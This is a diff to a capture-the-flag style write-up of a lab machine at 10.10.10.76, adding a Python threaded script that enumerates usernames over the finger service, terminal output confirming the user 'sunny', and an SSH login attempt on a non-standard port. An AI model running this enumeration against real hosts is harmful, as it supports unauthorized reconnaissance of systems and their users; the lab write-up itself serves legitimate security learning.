@@ -57,8 +57,107 @@ Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of th
 `
 ### Username Enumeration on Finger
 
-Next, what we will do is a username enumeration on finger using the script [here](https://github.com/pentestmonkey/finger-user-enum). 
+Next, what we will do is a username enumeration on finger using a script I wrote.
 
+```python
+import subprocess
+import numpy as np
+import threading
+import argparse
+
+valid = []
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    
+def getUsernames(fileName):
+	usernameFile = open(fileName,'r')
+	usernames = []
+	for username in usernameFile.readlines():
+		usernames.append(username.strip())
+	usernameFile.close()
+	return usernames
+
+def testFingerConnection(username,host):
+	command = f"finger {username}@{host}"
+	p = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+	isValidUser = True
+	countNumber = 0
+	for line in p.stdout.readlines():
+		decodedLine = line.decode()
+		number = decodedLine.count(username)
+		countNumber = max(countNumber,number)
+	if countNumber == 2:
+		valid.append(username)
+		return True
+	else:
+		return False
+
+def threadProcess(array_chunk, host):
+	for user in array_chunk:
+		isValidUser = testFingerConnection(user,host)
+		if isValidUser:
+			print(bcolors.WARNING + f"{user}: Valid credentials" + bcolors.ENDC)
+		else:
+			print(f"{user}: Invalid credentials")
+				
+def logic(fileName, host, number_threads):
+	users = getUsernames(fileName)
+	array_chunk = np.array_split(users, number_threads)
+	threadList = []
+	for threadNumber in range(number_threads):
+		thread = threading.Thread(target=threadProcess, args=(array_chunk[threadNumber], host),)
+		threadList.append(thread)
+		threadList[threadNumber].start()
+	
+	for thread in threadList:
+		thread.join()
+	
+	print(bcolors.OKCYAN + "\nValid credentials are:" + bcolors.ENDC)
+	count = 1
+	for x in valid:
+		print(str(count) + "." + x)
+		count += 1
+		
+if __name__ == '__main__':
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-host', help='Target host', required=True)
+	parser.add_argument('-threads', help='Number of threads', required=True)
+	parser.add_argument('-file', help='File location',required=True)
+	args = parser.parse_args()
+	
+	logic(args.file, args.host, int(args.threads))
+```
+
+From the output, we get that the valid credentials are ```he``` and ```sunny```. However, manual inspection showed that ```he``` is a false positive.
+
+```                                                                               
+┌──(kali㉿kali)-[~/Desktop]
+└─$ finger sunny@10.10.10.76 
+Login       Name               TTY         Idle    When    Where
+sunny    sunny                 pts/3        <Apr 24, 2018> 10.10.14.4               console      <Jul 31, 2020>
+                                                                                        
+┌──(kali㉿kali)-[~/Desktop]
+└─$ finger he@10.10.10.76                                                           1 ⨯
+Login       Name               TTY         Idle    When    Where
+he 
+```
+
+### SSH into Sunny
+Since we know that a user ```sunny``` exists. We will first try to SSH using ```sunny```. However, for this case we have to specify the port number as the SSH port is 22022 instead of the default 22. Also, we realize that we would require a password to SSH into the user ```sunny```
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76      1 ⚙
+Password:
+```
 ### Web-content discovery
 
 ## Exploit
